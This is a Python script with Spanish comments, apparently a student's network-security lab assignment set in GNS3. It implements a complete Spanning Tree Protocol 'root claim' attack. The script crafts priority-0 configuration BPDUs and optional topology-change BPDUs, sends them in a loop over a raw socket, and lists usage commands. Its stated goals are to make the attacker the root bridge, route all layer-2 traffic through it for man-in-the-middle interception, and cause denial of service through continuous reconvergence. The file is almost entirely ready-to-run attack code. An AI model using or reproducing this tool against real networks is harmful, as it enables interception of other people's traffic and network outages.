#!/usr/bin/env python3
# ==============================================================================
#  STP CLAIM ROOT ATTACK v3 — Spanning Tree Protocol Root Bridge Hijack
#  Autor     : Junior Javier Santos Perez
#  Matricula : 2024-1599
#  Red       : 10.0.99.0/24
#  Atacante  : 10.0.99.100 (eth0)
# ==============================================================================
#
#  DESCRIPCION:
#  Este script realiza un ataque STP (Spanning Tree Protocol) conocido como
#  "Root Claim" o "Root Bridge Hijack". Envía BPDUs de configuración con
#  prioridad 0 para que el switch legítimo ceda la posición de Root Bridge
#  al atacante, redirigiendo todo el tráfico de la red por él (MITM).
#
#  IMPACTO:
#  - El atacante se convierte en Root Bridge de la red
#  - Todo el tráfico L2 pasa por el atacante (Man in the Middle)
#  - Inestabilidad y reconvergencia continua de STP
#  - Posible caída de la red (DoS)
#
#  FLUJO DEL ATAQUE:
#  1. Atacante envía BPDUs con Bridge Priority = 0 (mínimo posible)
#  2. Los switches comparan su prioridad (32768) con la del atacante (0)
#  3. Como 0 < 32768, ceden el Root Bridge al atacante
#  4. La red recalcula la topología STP con el atacante como raíz
#
#  NOTA IMPORTANTE:
#  Para que este ataque funcione en GNS3 con switches IOU, el atacante
#  debe estar conectado DIRECTAMENTE a un switch IOU sin pasar por Cloud
#  o NAT de VMware. Se recomienda ejecutar desde un nodo Linux dentro
#  de GNS3 o usar PNetLab/EVE-NG.
#
#  USO:
#      sudo python3 stp_root_claim.py
#      sudo python3 stp_root_claim.py -i eth0 -p 0 -t 1
#      sudo python3 stp_root_claim.py -i eth0 -p 0 -t 1 --tcn
#
#  REQUISITOS:
#      Solo librerías estándar de Python 3 (socket, struct)
# ==============================================================================

import os
import sys
import time
import signal
import struct
import socket
import argparse
from threading import Thread, Event

stop_event = Event()
stats      = {"enviados": 0, "inicio": None}


# ──────────────────────────────────────────────────────────────────────────────
#  BANNER Y HELPERS
# ──────────────────────────────────────────────────────────────────────────────

def banner():
    print("""
╔══════════════════════════════════════════════════════════════╗
║      STP CLAIM ROOT ATTACK v3 — Root Bridge Hijack           ║
║  Autor     : Junior Javier Santos Perez                      ║
║  Matricula : 2024-1599                                       ║
╚══════════════════════════════════════════════════════════════╝
""")


def handler_salida(sig, frame):
    print("\n\n[!] Interrupción recibida. Deteniendo...")
    stop_event.set()


def mostrar_stats(intervalo=3):
    while not stop_event.is_set():
        time.sleep(intervalo)
        if stats["inicio"]:
            elapsed = time.time() - stats["inicio"]
            print(f"\r[*] BPDUs enviados: {stats['enviados']:,}  |  "
                  f"Tiempo: {elapsed:.1f}s     ", end="", flush=True)


def get_mac_bytes(interfaz):
    """Obtiene la MAC real de la interfaz como bytes."""
    try:
        import fcntl
        s    = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927,
                           struct.pack('256s', interfaz[:15].encode()))
        return info[18:24]
    except Exception:
        return bytes([0x00, 0x0c, 0x29, 0xb0, 0xf6, 0x1c])


def mac_str(mac_bytes):
    return ':'.join(f'{b:02x}' for b in mac_bytes)


# ──────────────────────────────────────────────────────────────────────────────
#  CONSTRUCCION DE BPDUs
# ──────────────────────────────────────────────────────────────────────────────

def construir_config_bpdu(src_mac, priority=0):
    """
    Configuration BPDU — anuncia al atacante como Root Bridge.

    Estructura del frame IEEE 802.3:
    [ dst(6) | src(6) | len(2) | LLC(3) | STP(35) ]

    LLC  : DSAP=0x42, SSAP=0x42, Ctrl=0x03
    STP Configuration BPDU (35 bytes):
      proto_id(2) + version(1) + type(1) + flags(1)
      + root_id(8) + root_cost(4) + bridge_id(8)
      + port_id(2) + msg_age(2) + max_age(2)
      + hello(2) + fwd_delay(2)
    """
    dst = b'\x01\x80\xc2\x00\x00\x00'  # STP multicast
    pri = struct.pack('>H', priority)   # 2 bytes big-endian

    stp = (
        b'\x00\x00'          # Protocol ID = 0 (STP)
        b'\x00'              # Version = 0
        b'\x00'              # BPDU Type = Configuration
        b'\x01'              # Flags = TCN ACK
        + pri                # Root Priority
        + src_mac            # Root MAC (atacante = raíz)
        + b'\x00\x00\x00\x00'  # Root Path Cost = 0
        + pri                # Bridge Priority
        + src_mac            # Bridge MAC
        + b'\x80\x01'        # Port ID
        + b'\x00\x00'        # Message Age = 0
        + b'\x14\x00'        # Max Age = 20s
        + b'\x02\x00'        # Hello Time = 2s
        + b'\x0f\x00'        # Forward Delay = 15s
    )

    llc     = b'\x42\x42\x03'
    payload = llc + stp
    length  = struct.pack('>H', len(payload))

    return dst + src_mac + length + payload


def construir_tcn_bpdu(src_mac):
    """
    TCN BPDU — Topology Change Notification.
    Fuerza a todos los switches a vaciar sus tablas MAC
    y reconvergir continuamente → efecto DoS adicional.
    """
    dst = b'\x01\x80\xc2\x00\x00\x00'
    stp = (
        b'\x00\x00'   # Protocol ID
        b'\x00'       # Version
        b'\x80'       # BPDU Type = TCN (0x80)
    )
    llc     = b'\x42\x42\x03'
    payload = llc + stp
    length  = struct.pack('>H', len(payload))

    return dst + src_mac + length + payload


# ──────────────────────────────────────────────────────────────────────────────
#  ATAQUE PRINCIPAL
# ──────────────────────────────────────────────────────────────────────────────

def stp_root_claim(interfaz, priority, intervalo, tcn_mode):
    signal.signal(signal.SIGINT, handler_salida)

    src_mac     = get_mac_bytes(interfaz)
    src_mac_str = mac_str(src_mac)

    print(f"[*] Interfaz        : {interfaz}")
    print(f"[*] MAC atacante    : {src_mac_str}")
    print(f"[*] Bridge Priority : {priority}  (switches legítimos = 32768)")
    print(f"[*] Bridge ID       : {priority}/{src_mac_str}")
    print(f"[*] Root Path Cost  : 0")
    print(f"[*] Intervalo BPDU  : {intervalo}s")
    print(f"[*] Modo TCN        : {'Sí — fuerza reconvergencia continua' if tcn_mode else 'No'}")
    print(f"[*] Destino STP     : 01:80:c2:00:00:00 (IEEE STP Multicast)")
    print("─" * 62)
    print("[*] Enviando BPDUs maliciosos... Presiona Ctrl+C para detener.\n")

    # Construir frames una vez
    frame_cfg = construir_config_bpdu(src_mac, priority)
    frame_tcn = construir_tcn_bpdu(src_mac)

    # Abrir raw socket
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        sock.bind((interfaz, 0))
    except PermissionError:
        print("[!] Requiere root: sudo python3 stp_root_claim.py")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error abriendo socket: {e}")
        sys.exit(1)

    # Hilo de estadísticas
    hilo = Thread(target=mostrar_stats, daemon=True)
    hilo.start()

    stats["inicio"] = time.time()
    enviados = 0

    while not stop_event.is_set():
        try:
            # Enviar Configuration BPDU (Root Claim)
            sock.send(frame_cfg)
            enviados += 1
            stats["enviados"] = enviados

            if enviados == 1:
                print(f"[→] Configuration BPDU enviado:")
                print(f"    Root ID   : {priority}/{src_mac_str}")
                print(f"    Bridge ID : {priority}/{src_mac_str}")
                print(f"    PathCost  : 0")
                print(f"    HelloTime : 2s | MaxAge: 20s | FwdDelay: 15s\n")

            # Modo TCN: enviar TCN BPDU para forzar reconvergencia
            if tcn_mode:
                sock.send(frame_tcn)
                enviados += 1
                stats["enviados"] = enviados

        except Exception as e:
            print(f"\n[!] Error: {e}")
            break

        if intervalo > 0:
            time.sleep(intervalo)

    sock.close()
    elapsed = time.time() - stats["inicio"]

    print(f"\n\n{'─'*62}")
    print(f"[✓] Ataque finalizado.")
    print(f"    BPDUs enviados : {enviados:,}")
    print(f"    Tiempo total   : {elapsed:.2f}s")
    print(f"{'─'*62}")
    print(f"\n[!] Verifica en los switches:")
    print(f"    ESW1# show spanning-tree")
    print(f"    Busca → Root MAC : {src_mac_str}")
    print(f"            Priority : 1  (0 + VLAN 1 en Cisco)")


# ──────────────────────────────────────────────────────────────────────────────
#  ARGUMENTOS CLI
# ──────────────────────────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="STP Root Claim Attack v3 — Root Bridge Hijack"
    )
    parser.add_argument("-i", "--interfaz",  default="eth0",
                        help="Interfaz de red (default: eth0)")
    parser.add_argument("-p", "--priority",  type=int, default=0,
                        help="Bridge priority (default: 0 = mínima)")
    parser.add_argument("-t", "--intervalo", type=float, default=2,
                        help="Intervalo entre BPDUs en segundos (default: 2)")
    parser.add_argument("--tcn", action="store_true",
                        help="Enviar TCN BPDUs para forzar reconvergencia continua")
    return parser.parse_args()


# ──────────────────────────────────────────────────────────────────────────────
#  MAIN
# ──────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    banner()
    if os.geteuid() != 0:
        print("[!] Requiere root: sudo python3 stp_root_claim.py")
        sys.exit(1)
    args = parse_args()
    stp_root_claim(args.interfaz, args.priority, args.intervalo, args.tcn)
